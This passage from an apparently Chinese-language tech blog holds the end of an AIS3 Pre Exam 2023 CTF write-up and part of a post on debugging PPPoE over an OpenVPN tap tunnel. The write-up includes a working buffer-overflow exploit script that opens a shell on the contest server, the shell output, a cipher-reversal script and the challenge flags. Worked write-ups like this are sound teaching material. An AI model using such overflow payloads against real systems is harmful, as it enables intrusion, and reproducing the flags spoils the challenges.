style=\"color:#e6db74\"\u003e\u0026#39;chals1.ais3.org\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e11111\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(\u003cspan style=\"color:#e6db74\"\u003eb\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;x\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e(\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e int(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;4017A9\u0026#39;\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eto_bytes(\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e, \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;little\u0026#39;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003er\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003erecvrepeat(timeout\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edecode(), end\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026gt; \u0026#39;\u003c/span\u003e, end\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    r\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(input()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#    r.send(sys.stdin.buffer.read())\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cpre tabindex=\"0\"\u003e\u003ccode\u003echummy@hitcon:~/ais3preexam2023$ python3 simpwnexp.py\n[+] Opening connection to chals1.ais3.org on port 11111: Done\nShow me your name:\n\u0026gt; ls\nFLAG\nbin\nboot\ndev\netc\nhome\nlib\nlib32\nlib64\nlibx32\nmedia\nmnt\nopt\nproc\nroot\nrun\nruntime\nsbin\nsrv\nsys\ntmp\nusr\nvar\n\u0026gt; cat FLAG\nAIS3{5imP1e_Pwn_4_beGinn3rs!}\n\u0026gt; exit\n\u0026gt;\n\u0026gt;\n[*] Closed connection to chals1.ais3.org port 11111\nTraceback (most recent call last):\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py\u0026#34;, line 65, in send_raw\n    self.sock.sendall(data)\nBrokenPipeError: [Errno 32] Broken pipe\n\nDuring handling of the above exception, another exception occurred:\n\nTraceback (most recent call last):\n  File \u0026#34;/home/chummy/ais3preexam2023/simpwnexp.py\u0026#34;, line 14, in \u0026lt;module\u0026gt;\n    r.send(input().encode())\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/tube.py\u0026#34;, line 778, in send\n    self.send_raw(data)\n  File \u0026#34;/home/chummy/.local/lib/python3.9/site-packages/pwnlib/tubes/sock.py\u0026#34;, line 70, in send_raw\n    raise EOFError\nEOFError\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"flag-3\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{5imP1e_Pwn_4_beGinn3rs!}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"simply-reverse\"\u003eSimply Reverse\u003c/h2\u003e\n\u003ch3 id=\"題目-5\"\u003e題目\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239952354-903f8815-c99c-414f-ada7-f5559bcd8636.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch3 id=\"解題-5\"\u003e解題\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIDA 打開\u003c/li\u003e\n\u003cli\u003e讀 verify\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239953043-467c41c6-7739-4d32-9c1f-723478da6244.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003e看起來是把 encrypted 依照 index 做 rotation 就會得到 flag\u003c/li\u003e\n\u003cli\u003e找 encrypted 的位置把 hex 複製下來\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/239955653-08e2130a-4c36-4935-94eb-f587269729c0.png\" alt=\"image\"\u003e\u003c/li\u003e\n\u003cli\u003e然後寫 code 算回來\u003c/li\u003e\n\u003c/ol\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003erotation\u003c/span\u003e(nowbyte, length):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e (((nowbyte \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e length) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e ((nowbyte \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u0026lt;\u003c/span\u003e (\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e length)) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e)) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eenbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efromhex(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;8A5092C8063D5B95B6521B35825AEAF8942872DDD45DE329BA5852A8643581AC0A64\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eansbytes \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(len(enbytes)):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    usebyte \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e enbytes[i] \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e usebyte \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        usebyte \u003cspan style=\"color:#f92672\"\u003e+=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e**\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ansbytes\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend((rotation(usebyte, (i \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e9\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e) \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e i) \u003cspan style=\"color:#f92672\"\u003e\u0026amp;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e255\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003estdout\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ebuffer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(bytes(ansbytes))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#print(bytes(ansbytes))\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"flag-4\"\u003eFlag\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{0ld_Ch@1_R3V1_fr@m_AIS32016!}\u003c/code\u003e\u003c/p\u003e\n","description":"","image":"/images/CTF.png","permalink":"https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/","title":"AIS3 Pre Exam 2023 Writeup"},{"content":"\u003ch2 id=\"緣由\"\u003e緣由\u003c/h2\u003e\n\u003cp\u003e當初會這樣是因為接到一個很有趣的 case\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/c20e43c3-3ed9-46ad-8c94-657afc66cd3c\" alt=\"image\"\u003e\n\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/4d1df898-0b4a-4a95-ac08-82b658b97a2c\" alt=\"image\"\u003e\n\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/acc1825f-0a69-4ec4-8a2e-fa84166df57c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e簡單來說就是想要 client 可以打 VPN 到另一邊，並且讓 PPPoE 可以透過 VPN 拿到中華電信的 public IP address。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/d1df4baf-2101-4aee-87d8-555316cc8d23\" alt=\"未命名绘图 drawio (63)\"\u003e\u003c/p\u003e\n\u003cp\u003e至於他們原本的架構，也是很有趣，首先會找人重架的原因是因為他們說接 VPN 後網路很不穩定，speedtest 也無法測速的那種。\u003c/p\u003e\n\u003cp\u003e於是我問了架構發現他們架構很酷。\u003c/p\u003e\n\u003cp\u003e首先他們是用那種小電腦做 server，如下圖。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/9f9de987-f4fd-499c-9ca5-f1d345b64b80\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e而裡面長這樣。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/339e3dde-62a9-4679-9cb5-5b12bcad7151\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e就是他小電腦裝 windows 10，裡面只有裝 VMware，然後開兩台 windows 的 VM，一台是 windows 7 做 VPN server，裡面用 softether vpn，另一台 windows 10 我不知道用途，他們說測試用。\u003c/p\u003e\n\u003cp\u003e然後我就想這一台小電腦塞那麼多台 windows 不當才怪，再加上 softether vpn 沒架過並沒有很熟，也不確定這個效能好不好。\u003c/p\u003e\n\u003cp\u003e於是我就推薦他們 host 機可以用 Proxmox VE 做虛擬化環境，然後 VPN 的部分由於 PPPoE 是 L2 的協定，需要 ethernet header，因此 VPN 的選擇上就需要用 L2 Tunnel。關於甚麼是 L2 Tunnel 可以去看\u003ca href=\"https://www.comparitech.com/blog/vpn-privacy/tun-tap-adapters/\"\u003e這篇文章\u003c/a\u003e與\u003ca href=\"https://ipwithease.com/layer-2-vs-layer-3-vpn/\"\u003e這篇文章\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e這邊我選擇用 OpenVPN tap 作為 L2 Tunnel。\u003c/p\u003e\n\u003cp\u003e因此架構就改成 Proxmox VE 裡面裝 Debian 跟 Windows 10，Debian 用 OpenVPN tap。\u003c/p\u003e\n\u003ch2 id=\"過程\"\u003e過程\u003c/h2\u003e\n\u003cp\u003e於是乎我開始架設 VPN 架設的 config 可以參考\u003ca href=\"https://github.com/Jimmy01240397/Chumy_Note/tree/master/Linux/openvpn/L2TunnelWithBridge\"\u003e這裡\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/99f456b3-72b5-47cc-ab8b-52506897f9a7\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/ceb4cee3-e651-4ba9-8ad8-778a0d787fc0\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/38bdd06e-8d04-4f55-98f8-f81f9f19241e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e架好的我開開心心的用 windows 測試\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/42470eb1-e58b-45f9-9900-f51110c465f5\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/605861b4-ef47-4c3f-9a78-2ee755807b28\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/953af183-6d55-4bb7-9b4c-d15b6d8d74df\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/d792d5ad-cf42-46a0-be71-2add2822aaeb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e到這邊我想說拿到 IP 了應該能動了，結果 ping 一下發現出不去。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/5e72324b-897f-4e73-85ea-2206df3859e2\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這就很奇怪了，於是乎我 ping 看看 ipv6 看看是不是一樣的問題，結果可以通。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/bdfcfaf2-9c57-42cb-beee-27744ba0375d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這下有趣了，V4 沒通 V6 有通，怎麼想都不正常，再加上我兩個都有拿到 IP。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/aaece719-a68f-43b4-b3f0-15a025e243eb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e而作為一個遇到問題會死命 debug 的我直接就開始抓包測試。\u003c/p\u003e\n\u003cp\u003e可以發現 ICMP ping 確實有封裝上 PPPoE header 並且從 VPN 網卡送出，且 VPN server 是有收到並轉發出去的，但是遲遲沒收到 response，因此可能是上游因為某些原因，可能不認可我們持有的 V4 IP 然後 drop 掉，但是認可 V6 的 IP。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/93f7dc97-4f4d-435e-bf5e-75bef15981f7\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/564b1f61-a22b-4786-be6d-7c45d0959b59\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e因此就要來想一下為何上游不認可這個 V4 IP，在思考很久後得出一個可能是因為有些包在中途掉包而導致 PPPoE server 沒收到某個 ACK 導致這個問題的發生。\u003c/p\u003e\n\u003cp\u003e所以就要拿 client 跟 server 的 pppoe pcap 分析來比對\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/ed8ef034-30f5-4240-829e-12145c9ade6b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e然後就可以發現有一個 ACK 送到 server 就不見了，這就有趣了，如此有規律的有特定包掉包，這基本上可以排除因為碰撞或資料有誤導致的自然掉包的可能。\u003c/p\u003e\n\u003cp\u003e這邊就有一個問題了，linux 作為 client 會不會有這種情況發生。\u003c/p\u003e\n\u003cp\u003e所以這邊就來測試。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/1fa5490a-519e-45d9-8bcb-547445ed3d80\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/c198b678-bfbc-4799-b742-6419dfa23791\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/76a02d48-b81b-43e0-946c-cc315a25481d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/7d768f82-ef58-4886-b34d-4e95717b8772\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e可以發現 linux 是完全正常的 PPPoE 也是通的，沒有發生 windows 的那種情況，那這代表是 windows 的 OpenVPN 網卡 driver 有問題。\u003c/p\u003e\n\u003cp\u003e那接下來就要想問題點了。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/6a8c7594-6938-43cc-935c-fef504480ba1\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e為何他如此與眾不同，這邊就可以聯想到這個 packet 是所有 PPPoE packet 中最小的，長度只有 32 byte。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/1823efca-2831-4673-8974-282440bb2857\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e因此我猜測是因為長度問題，可能 driver 某個地方有一個如果發現 packet 長度過短就 drop 掉的 code。\u003c/p\u003e\n\u003cp\u003e所以我就用 scapy 寫了一個可以發送很小的 ethernet frame 的測試程式來做測試。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e scapy.all \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eIFACES\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eshow() \u003cspan style=\"color:#75715e\"\u003e# let’s see what interfaces are available. Windows only\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eiface \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e IFACES\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edev_from_index(\u003cspan style=\"color:#ae81ff\"\u003e35\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esocket \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e conf\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eL2socket(iface\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eiface)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003epayload \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e Ether(dst \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e], src \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e])\u003cspan style=\"color:#f92672\"\u003e/\u003c/span\u003eRaw(load\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(bytes(payload))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(len(bytes(payload)))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esocket\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esend(payload)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e先發一個長度 40 的包。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/a78c31c2-c4b2-4a5c-aded-d4603d2d5cd1\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/a45f523d-0441-405e-913a-9226f05e576d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e發現 server 有收到，改發長度 20 的包。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/3cdaa8b3-4ab1-46dd-bef2-aad0d04d0442\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/2d31fe5b-2fdc-43ef-8049-08e3dc9ade77\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e會發現 server 沒有收到，改發長度 30 的包。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/52d60a30-0e3c-4986-b0fe-d3c7f93b45c1\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/43f34a8d-d2ac-4a54-8d4c-99338786cab8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e會發現 server 還是沒有收到，改發長度 35 的包。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/21a980cb-cb73-4865-a4bb-00eb0f4fc4f2\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/1b87c1b9-2f26-439d-8ced-5e1e7254109d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e會發現 server 收到了，改發長度 33 的包。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/84416f87-3642-49f0-b2ef-280bd083c2eb\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/8791b7f9-6e40-4f23-935e-fee3a50987d0\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e會發現 server 又沒有收到，改發長度 34 的包。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/92fe6f69-1d75-423e-87e8-e8031bdf5d4c\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/34559391-8bc9-4f39-b652-f974a5ce1ff8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e會發現 server 又收到了。\u003c/p\u003e\n\u003cp\u003e因此我們可以確定最小可以接受的 packet length 是 34，由於 IPv4 的 configuration ACK 大小是 32，因此再送往 server 前就被 windows 的 driver 給 drop 掉了，也就是。\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(packet) \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e34\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    drop(packet)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e因此我就去搜 \u003ca href=\"https://github.com/OpenVPN/tap-windows6\"\u003etap-windows6\u003c/a\u003e 這個 repo 裡有沒有地方是 34 的。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/2a3cfae7-2ae8-4b9d-99fc-063b858228d5\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/f946dad1-1054-4cf5-8c91-285c42a09c12\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e但是沒發現任何東西，於是慢慢減少數字看看有沒有甚麼線索，直到找到 20 